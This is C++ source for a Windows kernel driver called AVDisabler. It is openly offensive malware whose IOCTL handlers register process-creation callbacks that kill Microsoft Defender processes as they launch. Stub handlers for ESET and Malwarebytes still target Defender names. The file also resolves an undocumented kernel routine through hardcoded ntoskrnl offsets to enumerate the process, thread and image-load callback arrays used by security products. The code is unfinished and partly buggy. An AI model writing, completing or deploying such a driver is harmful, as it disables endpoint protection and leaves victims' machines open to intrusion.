#include <ntddk.h>
//#include "CallbackRegistrations.h"
#include <Stdio.h>


#define DeviceType 0x8001
#define PROCESS_TERMINATE 1

#define IOCTL_DISABLE_DEFENDER CTL_CODE(DeviceType, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)		
#define IOCTL_DISABLE_ESET CTL_CODE(DeviceType, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)			
#define IOCTL_DISABLE_MALWAREBYTES CTL_CODE(DeviceType, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)	

//TODO: Add an initial process termination functiona that will be called at the start of each process creation callback routine 
//	on each UNICODE_STRING image related to the AV Vendor (Defender, ESET, Malwarebytes) etc...

ULONG_PTR PspCreateProcessCallbackRoutine = 0;
ULONG_PTR PspCreateThreadCallbackRoutine = 0;
ULONG_PTR PspLoadImageCallbackRoutine = 0;

typedef NTSTATUS(NTAPI* fObOpenObjectByPointer)(
	PVOID Object,
	ULONG HandleAttributes,
	PACCESS_STATE PassedAccessState,
	ACCESS_MASK DesiredAccess,
	POBJECT_TYPE ObjectType,
	KPROCESSOR_MODE AccessMode,
	PHANDLE Handle);


//Add more....
UNICODE_STRING DefenderMsMpEng = RTL_CONSTANT_STRING(L"MsMpEng.exe");
UNICODE_STRING DefenderSecurityHealthService = RTL_CONSTANT_STRING(L"SecurityHealthService.exe");
UNICODE_STRING DefenderSecurityHealthSystray = RTL_CONSTANT_STRING(L"SecurityHealthSystray.exe");
UNICODE_STRING DefenderSecurityHealthHost = RTL_CONSTANT_STRING(L"SecurityHealthHost.exe");
UNICODE_STRING DefenderSecHealthUI = RTL_CONSTANT_STRING(L"SecHealthUI.exe");

BOOLEAN g_IsDefenderCallbackRoutineSet = FALSE;
BOOLEAN g_IsEsetCallbackRoutineSet = FALSE;
BOOLEAN g_IsMalwareBytesCallbackRoutineSet = FALSE;


NTSTATUS GetFileNameFromPath(IN UNICODE_STRING FullPath, OUT UNICODE_STRING* FileName)
{
	// Check for valid input parameters
	if (FullPath.Buffer == NULL || FileName == NULL)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Special case handling for "C:\" or similar paths
	if (FullPath.Length == 4 && FullPath.Buffer[0] == L'C' && FullPath.Buffer[1] == L':' && FullPath.Buffer[2] == L'\\')
	{
		// For "C:\", consider it as the root, so no file name
		FileName->Buffer = FullPath.Buffer + 3;  // Skip the "C:\"
		FileName->Length = 0;                    // No file name after the backslash
		FileName->MaximumLength = FullPath.MaximumLength;
		return STATUS_SUCCESS;
	}

	// Start from the end of the FullPath string
	PWSTR pBackslash = NULL;
	for (PWSTR p = FullPath.Buffer + FullPath.Length / sizeof(WCHAR) - 1; p >= FullPath.Buffer; p--)
	{
		if (*p == L'\\') // Found the last backslash
		{
			pBackslash = p;
			break;
		}
	}

	if (pBackslash == NULL)
	{
		// No backslash found, so the whole path is the filename
		FileName->Buffer = FullPath.Buffer;
		FileName->Length = FullPath.Length;
		FileName->MaximumLength = FullPath.MaximumLength;
	}
	else
	{
		// Set FileName to point after the last backslash
		FileName->Buffer = pBackslash + 1;
		FileName->Length = (USHORT)((FullPath.Buffer + FullPath.Length / sizeof(WCHAR) - 1) - pBackslash) * sizeof(WCHAR);
		FileName->MaximumLength = FileName->Length + sizeof(WCHAR);  // Plus the null terminator
	}

	return STATUS_SUCCESS;
}


void PreventDefenderProcessCreate(PEPROCESS Process,
								  HANDLE ProcessId,
								  PPS_CREATE_NOTIFY_INFO CreateInfo)
{
	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hProcess = nullptr;

	UNICODE_STRING ObOpenObjectByPointerFuncName = RTL_CONSTANT_STRING(L"ObOpenObjectByPointer");
	fObOpenObjectByPointer ObOpenObjectByPointer = (fObOpenObjectByPointer)MmGetSystemRoutineAddress(&ObOpenObjectByPointerFuncName);
	KdPrint(("[+]AVDisablerDriver::PreventDefenderProcessCreate: ObGetObjectByPointer address: 0x%p\n", ObOpenObjectByPointer));
	
	UNICODE_STRING ImageFileName;
	status = GetFileNameFromPath(*CreateInfo->ImageFileName, &ImageFileName);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[-] AVDisabler::DriverEntry:GetFileNameFromPath was failed with NTSTATUS 0x%x\n", status));
		return;
	}
	// checking if the process being created is one of defender's processes
	if (RtlCompareUnicodeString(&ImageFileName, &DefenderMsMpEng, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthService, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthSystray, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthHost, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecHealthUI, TRUE) == 0)
	{
		status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, nullptr, GENERIC_ALL, *PsProcessType, KernelMode, &hProcess);
		if (!NT_SUCCESS(status))
		{
			KdPrint(("[-] AVDisabler::PreventDefenderProcessCreate: Can't open handle to process. (NTSTATUS: 0x%x)\n", status));
			return;
		}

		KdPrint(("[+] AVDisabler::PreventDefenderProcessCreate: handle to %wZ was opened successfully!!\n", CreateInfo->ImageFileName));
		status = ZwTerminateProcess(hProcess, STATUS_ACCESS_VIOLATION); //Check if there is a need to ObDerefernceObject() the PEPROCESS to avoid memory leak
		if (!NT_SUCCESS(status))
		{
			KdPrint(("[-] AVDisabler::PreventDefenderProcessCreate: Can't terminate process (NTSTATUS: 0x%x)\n", status));
			//ObCloseHandle(hProcess, 0);  <-- Might not be necessary
			return;
		}

		KdPrint(("[+] AVDisabler::PreventDefenderProcessCreate: process %d of %wZ was terminated successfully!!\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName));
		
	}
}

NTSTATUS TerminateAVCallbackRoutines(ULONG_PTR* PspCreateProcessNotifyRoutine,
									 ULONG_PTR* PspCreateThreadNotifyRoutine,
									 ULONG_PTR* PspLoadImageNotifyRoutine)
{
	/*
		----Needs to be tested!!!---

		PspEnumerateCallback needs to be resolved differently!!!
	*/

	typedef int(NTAPI* pPspEnumerateCallback)(
		int ObjectTypeRoutineArrayIndex,
		DWORD32* PCallbackIndex,
		ULONG_PTR* TargetRoutineBaseAddress);
	
	UNICODE_STRING PspEnumerateCallbackName = RTL_CONSTANT_STRING(L"PspEnumerateCallback");
	//pPspEnumerateCallback PspEnumerateCallback = (pPspEnumerateCallback)MmGetSystemRoutineAddress(&PspEnumerateCallbackName);
	UNICODE_STRING ExAllocatePoolName = RTL_CONSTANT_STRING(L"ExAllocatePool");
	ULONG_PTR ExAllocatePoolAddress = (ULONG_PTR)MmGetSystemRoutineAddress(&ExAllocatePoolName);
	KdPrint(("[+] AVDisabler::TerminateAVCallbackRoutines: ExAllocatePool: 0x%p\n", ExAllocatePoolAddress));

	PVOID NtosKernelBaseAddress = (PVOID)(ExAllocatePoolAddress - 0x3F46C0);
	KdPrint(("[+] AVDisabler::TerminateAVCallbackRoutines: ntoskrnl.exe base address: 0x%p\n", NtosKernelBaseAddress));

	pPspEnumerateCallback PspEnumerateCallback = (pPspEnumerateCallback)((ULONG_PTR)NtosKernelBaseAddress + 0xA3F930);
	if(!PspEnumerateCallback)
	{
		KdPrint(("[-] AVDisabler::TerminateAVCallbackRoutines: Couldn't resolve PspEnumerateCallback address\n"));
		return STATUS_INVALID_ADDRESS;
	}
	KdPrint(("[*] AVDisabler::TerminateAVCallbackRoutines: PspEnumerateCallback address at: 0x%p\n", PspEnumerateCallback));
	
	DWORD32 CallbackIndex = 0;
	//DWORD32 CallbackIndex = 1; // Process type
	PspEnumerateCallback(1, &CallbackIndex, PspCreateProcessNotifyRoutine);
	if(!(*PspCreateProcessNotifyRoutine))
	{
		KdPrint(("[-] AVDisabler::TerminateAVCallbackRoutines: PspCreateProcessNotifyRoutine address is 0x0,\neither there is no process creation callback routines or there is a bug\n"));
		return STATUS_INVALID_ADDRESS;
	}
	KdPrint(("[+] AVDisabler::TerminateAVCallbackRoutines: Base Address of PspCreateProcessNotifyRoutine: 0x%p\n", *PspCreateProcessNotifyRoutine));
	
	//CallbackIndex = 0; // Thread type
	CallbackIndex = 0;
	PspEnumerateCallback(0, &CallbackIndex, PspCreateThreadNotifyRoutine);
	if (!(*PspCreateThreadNotifyRoutine))
	{
		KdPrint(("[-] AVDisabler::TerminateAVCallbackRoutines: PspCreateThreadNotifyRoutine address is 0x0,\neither there is no thread creation callback routines or there is a bug\n"));
		return STATUS_INVALID_ADDRESS;
	}
	KdPrint(("[+] AVDisabler::TerminateAVCallbackRoutines: Base Address of PspCreateThreadNotifyRoutine: 0x%p\n", *PspCreateThreadNotifyRoutine));
	
	//CallbackIndex = 2; // Image type
	CallbackIndex = 0;
	PspEnumerateCallback(2, &CallbackIndex, PspLoadImageNotifyRoutine);
	if (!(*PspLoadImageNotifyRoutine))
	{
		KdPrint(("[-] AVDisabler::TerminateAVCallbackRoutines: PspLoadImageNotifyRoutine address is 0x0,\neither there is no load image callback routines or there is a bug\n"));
		return STATUS_INVALID_ADDRESS;
	}
	KdPrint(("[+] AVDisabler::TerminateAVCallbackRoutines: Base Address of PspLoadImageNotifyRoutine: 0x%p\n", *PspLoadImageNotifyRoutine));
	return STATUS_SUCCESS;
}

void PreventEsetProcessCreate(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
{
	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hProcess = nullptr;

	UNICODE_STRING ObOpenObjectByPointerFuncName = RTL_CONSTANT_STRING(L"ObOpenObjectByPointer");
	fObOpenObjectByPointer ObOpenObjectByPointer = (fObOpenObjectByPointer)MmGetSystemRoutineAddress(&ObOpenObjectByPointerFuncName);
	KdPrint(("[+]AVDisablerDriver::PreventEsetProcessCreate: ObGetObjectByPointer address: 0x%p\n", ObOpenObjectByPointer));

	// checking if the process being created is one of ESET's processes
	// 
	// ---------- !!!!!need to modify the processes' variables to ESET images names!!!!! ----------
	UNICODE_STRING ImageFileName;
	status = GetFileNameFromPath(*CreateInfo->ImageFileName, &ImageFileName);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[-] AVDisabler::DriverEntry:GetFileNameFromPath was failed with NTSTATUS 0x%x\n", status));
		return;
	}
	// checking if the process being created is one of Eset's processes
	if (RtlCompareUnicodeString(&ImageFileName, &DefenderMsMpEng, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthService, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthSystray, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthHost, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecHealthUI, TRUE) == 0)
	{
		status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, nullptr, GENERIC_ALL, *PsProcessType, KernelMode, &hProcess);
		if (!NT_SUCCESS(status))
		{
			KdPrint(("[-] AVDisabler::PreventEsetProcessCreate: Can't open handle to process. (NTSTATUS: 0x%x)\n", status));
			return;
		}

		KdPrint(("[+] AVDisabler::PreventEsetProcessCreate: handle to %wZ was opened successfully!!\n", CreateInfo->ImageFileName));
		status = ZwTerminateProcess(hProcess, STATUS_ACCESS_VIOLATION); //Check if there is a need to ObDerefernceObject the PEPROCESS to avoid memory leak
		if (!NT_SUCCESS(status))
		{
			KdPrint(("[-] AVDisabler::PreventEsetProcessCreate: Can't terminate process (NTSTATUS: 0x%x)\n", status));
			//ObCloseHandle(hProcess, 0);  <-- Might not be necessary
			return;
		}

		KdPrint(("[+] AVDisabler::PreventEsetProcessCreate: process %d of %wZ was terminated successfully!!\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName));

	}
}

void PreventMalwareBytesProcessCreate(PEPROCESS Process,
	HANDLE ProcessId,
	PPS_CREATE_NOTIFY_INFO CreateInfo)
{

	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hProcess = nullptr;

	UNICODE_STRING ObOpenObjectByPointerFuncName = RTL_CONSTANT_STRING(L"ObOpenObjectByPointer");
	fObOpenObjectByPointer ObOpenObjectByPointer = (fObOpenObjectByPointer)MmGetSystemRoutineAddress(&ObOpenObjectByPointerFuncName);
	KdPrint(("[+]AVDisablerDriver::PreventMalwareBytesProcessCreate: ObGetObjectByPointer address: 0x%p\n", ObOpenObjectByPointer));

	// checking if the process being created is one of Malwarebyte's processes
	// 
	// ---------- !!!!!need to modify the processes' variables to Malwarebytes images names!!!!! ----------
	UNICODE_STRING ImageFileName;
	status = GetFileNameFromPath(*CreateInfo->ImageFileName, &ImageFileName);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[-] AVDisabler::DriverEntry:GetFileNameFromPath was failed with NTSTATUS 0x%x\n", status));
		return;
	}
	// checking if the process being created is one of MalwareBytes's processes
	if (RtlCompareUnicodeString(&ImageFileName, &DefenderMsMpEng, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthService, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthSystray, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthHost, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecHealthUI, TRUE) == 0)
	{
		status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, nullptr, GENERIC_ALL, *PsProcessType, KernelMode, &hProcess);
		if (!NT_SUCCESS(status))
		{
			KdPrint(("[-] AVDisabler::PreventMalwareBytesProcessCreate: Can't open handle to process. (NTSTATUS: 0x%x)\n", status));
			return;
		}

		KdPrint(("[+] AVDisabler::PreventMalwareBytesProcessCreate: handle to %wZ was opened successfully!!\n", CreateInfo->ImageFileName));
		status = ZwTerminateProcess(hProcess, STATUS_ACCESS_VIOLATION); //Check if there is a need to ObDerefernceObject the PEPROCESS to avoid memory leak
		if (!NT_SUCCESS(status))
		{
			KdPrint(("[-] AVDisabler::PreventMalwareBytesProcessCreate: Can't terminate process (NTSTATUS: 0x%x)\n", status));
			//ObCloseHandle(hProcess, 0);  <-- Might not be necessary
			return;
		}

		KdPrint(("[+] AVDisabler::PreventMalwareBytesProcessCreated: process %d of %wZ was terminated successfully!!\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName));

	}
}

NTSTATUS CompleteRequest(NTSTATUS status, PIRP Irp, ULONG_PTR information)
{
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = information;
	IoCompleteRequest(Irp, 0);
	
	return status;
}


NTSTATUS CreateCloseDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp) 
{
	UNREFERENCED_PARAMETER(DeviceObject);
	return CompleteRequest(STATUS_SUCCESS, Irp, 0);
}


NTSTATUS IOCTLHandlerDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION IoStackLocation = IoGetCurrentIrpStackLocation(Irp);
	char OutputBuffer[256];

	switch (IoStackLocation->Parameters.DeviceIoControl.IoControlCode)
	{
		case IOCTL_DISABLE_DEFENDER:
		{
			ULONG_PTR InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
			ULONG_PTR OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
			PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...

			if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
			{
				KdPrint(("AVDisablerDriver::IOCTL_DISABLE_DEFENDER: invalid size of input buffer!\n"));
				return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);
			}

			status = PsSetCreateProcessNotifyRoutineEx(&PreventDefenderProcessCreate, FALSE);
			
			if (!NT_SUCCESS(status)) 
			{
				sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_DEFENDER: Failed to set Defender's process creation callback routine\n (NTSTATUS: 0x%x)", status);
				KdPrint((OutputBuffer));
				memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
				return CompleteRequest(status, Irp, sizeof(OutputBuffer));
			}

			g_IsDefenderCallbackRoutineSet = TRUE;
			KdPrint(("[+] AVDsiablerDriver::IOCTL_DISABLE_DEFENDER: Process creation callback routine was created successfully!\n"));
		}

		case IOCTL_DISABLE_ESET:
		{
			ULONG_PTR InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
			ULONG_PTR OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
			PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...
			if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
			{
				KdPrint(("AVDisablerDriver::IOCTL_DISABLE_ESET: invalid size of input buffer!\n"));
				return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);
			}

			status = PsSetCreateProcessNotifyRoutineEx(&PreventEsetProcessCreate, FALSE);
			if (!NT_SUCCESS(status))
			{
				sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_ESET: Failed to set ESET's related process creation callback routine\n (NTSTATUS: 0x%x)", status);
				KdPrint((OutputBuffer));
				memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
				return CompleteRequest(status, Irp, 0);
			}
			g_IsEsetCallbackRoutineSet = TRUE;
			KdPrint(("[+] AVDsiablerDriver::IOCTL_DISABLE_ESET: Process creation callback routine was created successfully!\n"));

		}

		case IOCTL_DISABLE_MALWAREBYTES:
		{
			ULONG_PTR InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
			ULONG_PTR OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
			PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...
			if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
			{
				KdPrint(("AVDisablerDriver::IOCTL_DISABLE_MALWAREBYTES: invalid size of input buffer!\n"));
				return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);

			}

			status = PsSetCreateProcessNotifyRoutineEx(&PreventMalwareBytesProcessCreate, FALSE);
			if (!NT_SUCCESS(status))
			{
				sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_MALWAREBYTES: Failed to set MalwareByte's related process creation callback routine\n (NTSTATUS: 0x%x)", status);
				KdPrint((OutputBuffer));
				memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
				return CompleteRequest(status, Irp, 0);
			}
			g_IsMalwareBytesCallbackRoutineSet = TRUE;
			KdPrint(("[+] AVDisablerDriver::IOCTL_DISABLE_MALWAREBYTES: Process creation callback routine was created successfully!\n"));
		}
	}

	return CompleteRequest(status, Irp, 0);
}

VOID UnloadRoutine(PDRIVER_OBJECT DriverObject)
{
	NTSTATUS status = STATUS_SUCCESS;
	PDEVICE_OBJECT DeviceObject = DriverObject->DeviceObject;
	UNICODE_STRING DeviceSymlink = RTL_CONSTANT_STRING(L"\\??\\AVDisabler");

	if(g_IsDefenderCallbackRoutineSet)
	{
		status = PsSetCreateProcessNotifyRoutineEx(&PreventDefenderProcessCreate, TRUE);
		if (!NT_SUCCESS(status))
			KdPrint(("[-] AVDsiablerDriver::UnloadRoutine: Failed to unset Defender's related process creation callback routine\n (NTSTATUS: 0x%x)", status));
	}

	if (g_IsEsetCallbackRoutineSet)
	{
		status = PsSetCreateProcessNotifyRoutineEx(&PreventEsetProcessCreate, TRUE);
		if (!NT_SUCCESS(status))
			KdPrint(("[-] AVDsiablerDriver::UnloadRoutine: Failed to unset ESET's related process creation callback routine\n (NTSTATUS: 0x%x)", status));
	}

	if (g_IsMalwareBytesCallbackRoutineSet)
	{
		status = PsSetCreateProcessNotifyRoutineEx(&PreventMalwareBytesProcessCreate, TRUE); //<- needs to be defined first
		if (!NT_SUCCESS(status))
			KdPrint(("[-] AVDsiablerDriver::UnloadRoutine: Failed to unset MalwareBytes' related process creation callback routine\n (NTSTATUS: 0x%x)", status));
	}

	IoDeleteDevice(DeviceObject);
	status = IoDeleteSymbolicLink(&DeviceSymlink);
	if(!NT_SUCCESS(status))
	{
		KdPrint(("[-] AVDisablerDriver[Unload Routine]: couldn't delete symlink %wZ (NTSTATUS: 0x%x)\n", &DeviceSymlink, status));
		return;
	}
	
	KdPrint(("[+] AVDisablerDriver[Unload Routine]: unload routine executed successfully!\n"));	
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	NTSTATUS status = STATUS_SUCCESS;
	PDEVICE_OBJECT DeviceObject = nullptr;
	UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\AVDisabler");
	UNICODE_STRING DeviceSymlink = RTL_CONSTANT_STRING(L"\\??\\AVDisabler");

	UNICODE_STRING TestFullPath = RTL_CONSTANT_STRING(L"C:\\Users\\user\\test.txt");
	UNICODE_STRING a;
	status = GetFileNameFromPath(TestFullPath, &a);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[-] AVDisabler::DriverEntry:GetFileNameFromPath was failed with NTSTATUS 0x%x\n", status));
		return status;
	}
	KdPrint(("[+] AVDisabler::DriverEntry: GetFileNameFromPath was executed successfully and returned: %wZ", &a));

	status = IoCreateDevice(DriverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[*] Error creating device %wZ (NTSTATUS: 0x%x)\n", &DeviceName, status));
		return status;
	}
	KdPrint(("[+] AVDisabler::DriverEntry: Device %wZ was created successfully!\n", &DeviceName));
	status = IoCreateSymbolicLink(&DeviceSymlink, &DeviceName);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[*] Error creating device symlink %wZ (NTSTATUS: 0x%x)\n", &DeviceName, status));
		IoDeleteDevice(DeviceObject);
		return status;
	}

	KdPrint(("[+] AVDisabler::DriverEntry: Device symlink %wZ was created successfully!\n", &DeviceSymlink));

	status = TerminateAVCallbackRoutines(&PspCreateProcessCallbackRoutine, &PspCreateThreadCallbackRoutine, &PspLoadImageCallbackRoutine);

	KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutine[0]: 0x%p\n", *(ULONG_PTR**)PspCreateProcessCallbackRoutine));
	KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutine[0]: 0x%p\n", *(ULONG_PTR**)PspCreateThreadCallbackRoutine));
	KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutine[0]: 0x%p\n", *(ULONG_PTR**)PspLoadImageCallbackRoutine));

	DWORD32 PspCreateThreadCallbackRoutineCount = 0;
	DWORD32 PspCreateProcessCallbackRoutineCount = 0;
	DWORD32 PspLoadImageCallbackRoutineCount = 0;

	while (*(ULONG_PTR**)PspCreateProcessCallbackRoutine != (ULONG_PTR)0x0 ||
		   *(ULONG_PTR**)PspCreateThreadCallbackRoutine != (ULONG_PTR)0x0 ||
		   *(ULONG_PTR**)PspLoadImageCallbackRoutine != (ULONG_PTR)0x0)
	{
		/*
		Need to add edge cases:
			- where both loadimage and thread are 0
			- where both loadimage and process are 0
		*/
		if (*(ULONG_PTR**)PspCreateProcessCallbackRoutine == (ULONG_PTR)0x0)
		{
			PspCreateThreadCallbackRoutine += 0x8;
			PspLoadImageCallbackRoutine += 0x8;

			PspCreateThreadCallbackRoutineCount++;
			PspLoadImageCallbackRoutineCount++;

			KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutine[%d]: 0x%p\n", PspLoadImageCallbackRoutineCount, *(ULONG_PTR**)PspLoadImageCallbackRoutine));
			KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutine[%d]: 0x%p\n", PspCreateThreadCallbackRoutineCount, *(ULONG_PTR**)PspCreateThreadCallbackRoutine));
		}

		if (*(ULONG_PTR**)PspCreateThreadCallbackRoutine == (ULONG_PTR)0x0)
		{
			PspCreateProcessCallbackRoutine += 0x8;
			PspLoadImageCallbackRoutine += 0x8;

			PspCreateProcessCallbackRoutineCount++;
			PspLoadImageCallbackRoutineCount++;

			KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutine[%d]: 0x%p\n", PspLoadImageCallbackRoutineCount, *(ULONG_PTR**)PspLoadImageCallbackRoutine));
			KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutine[%d]: 0x%p\n", PspCreateProcessCallbackRoutineCount, *(ULONG_PTR**)PspCreateProcessCallbackRoutine));

		}

		if (*(ULONG_PTR**)PspLoadImageCallbackRoutine == (ULONG_PTR)0x0)
		{
			PspCreateProcessCallbackRoutine += 0x8;
			PspCreateThreadCallbackRoutine += 0x8;

			PspCreateProcessCallbackRoutineCount++;
			PspCreateThreadCallbackRoutineCount++;

			KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutine[%d]: 0x%p\n", PspCreateThreadCallbackRoutineCount, *(ULONG_PTR**)PspCreateThreadCallbackRoutine));
			KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutine[%d]: 0x%p\n", PspCreateProcessCallbackRoutineCount, *(ULONG_PTR**)PspCreateProcessCallbackRoutine));

		}

		if(*(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0 &&
		   *(ULONG_PTR**)PspCreateThreadCallbackRoutine != 0x0 &&
		   *(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0)
		{
			PspCreateProcessCallbackRoutine += 0x8;
			PspCreateThreadCallbackRoutine += 0x8;
			PspLoadImageCallbackRoutine += 0x8;

			PspCreateProcessCallbackRoutineCount++;
			PspCreateThreadCallbackRoutineCount++;
			PspLoadImageCallbackRoutineCount++;

			KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutine[%d]: 0x%p\n", PspLoadImageCallbackRoutineCount, *(ULONG_PTR**)PspLoadImageCallbackRoutine));
			KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutine[%d]: 0x%p\n", PspCreateProcessCallbackRoutineCount, *(ULONG_PTR**)PspCreateProcessCallbackRoutine));
			KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutine[%d]: 0x%p\n", PspCreateThreadCallbackRoutineCount, *(ULONG_PTR**)PspCreateThreadCallbackRoutine));
		}
	}

	PspCreateProcessCallbackRoutineCount--;
	PspCreateThreadCallbackRoutineCount--;
	PspLoadImageCallbackRoutineCount--;

	KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutineCount: %d\n", PspCreateProcessCallbackRoutineCount));
	KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutineCount: %d\n", PspCreateThreadCallbackRoutineCount));
	KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutineCount: %d\n", PspLoadImageCallbackRoutineCount));

	status = TerminateAVCallbackRoutines(&PspCreateProcessCallbackRoutine, &PspCreateThreadCallbackRoutine, &PspLoadImageCallbackRoutine);

	for (int i = 0; i < PspCreateProcessCallbackRoutineCount; i++)
	{
		KdPrint(("[*] AVDisabler::DriverEntry After: PspCreateProcessCallbackRoutine[%d]: 0x%p\n", i, *(ULONG_PTR**)(PspCreateProcessCallbackRoutine)));
		PspCreateProcessCallbackRoutine += 0x8;
	}
	KdPrint(("\n"));
	for (int i = 0; i < PspCreateThreadCallbackRoutineCount; i++)
	{
		KdPrint(("[*] AVDisabler::DriverEntry After: PspCreateThreadCallbackRoutine[%d]: 0x%p\n", i, *(ULONG_PTR**)(PspCreateThreadCallbackRoutine)));
		PspCreateThreadCallbackRoutine += 0x8;
	}
	KdPrint(("\n"));
	for (int i = 0; i < PspLoadImageCallbackRoutineCount; i++)
	{
		KdPrint(("[*] AVDisabler::DriverEntry  After: PspLoadImageCallbackRoutine[%d]: 0x%p\n", i, *(ULONG_PTR**)(PspLoadImageCallbackRoutine)));
		PspLoadImageCallbackRoutine += 0x8;
	}	
	KdPrint(("\n"));
	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateCloseDispatchRoutine;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateCloseDispatchRoutine;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IOCTLHandlerDispatchRoutine;
	DriverObject->DriverUnload = UnloadRoutine;

	KdPrint(("AVDisabler::DriverEntry: Initialization completed successfully!\n"));

	return status;
}
